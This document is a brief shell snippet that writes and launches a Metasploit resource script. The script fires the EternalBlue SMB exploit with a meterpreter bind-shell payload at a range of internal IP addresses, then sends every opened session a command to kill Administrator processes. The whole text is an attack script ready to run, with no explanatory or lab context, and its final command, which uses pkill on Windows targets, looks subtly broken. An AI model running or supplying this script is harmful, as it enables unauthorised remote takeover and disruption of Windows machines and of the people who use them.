echo'
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp
set rhosts 10.1.33.12-30
run
sessions -C "pkill -U Administrator"'
>> 403.rc
msfconsole -r 403.rc